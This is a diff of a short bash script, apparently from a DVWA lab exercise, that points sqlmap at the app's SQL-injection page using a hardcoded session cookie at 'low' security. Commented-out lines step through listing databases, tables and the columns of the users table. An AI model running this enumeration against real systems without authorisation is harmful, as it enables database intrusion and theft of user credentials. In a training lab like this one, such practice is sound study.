@@ -1,10 +1,11 @@
 #!/usr/bin/env bash
-IP=localhost
-SESSION_ID=mtu2lu58fjtmbplnptm1oshlu7
-URL="http://${IP}/vulnerabilities/sqli/?id=1&Submit=Submit#"
+SESSION_ID="066f7c55695c9c2d651ee0f421db861f"
+IP="10.0.0.5";
+URL="http://${IP}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#"
 COOKIE="PHPSESSID=${SESSION_ID};security=low"
 
-sqlmap -u $URL --cookie=$COOKIE --flush-session 
+echo "$URL"
+sqlmap -u $URL --cookie=$COOKIE --flush-session
 #sqlmap -u $URL --cookie=$COOKIE --dbs
 #sqlmap -u $URL --cookie=$COOKIE -D dvwa --tables
 #sqlmap -u $URL --cookie=$COOKIE -D dvwa -T users --columns
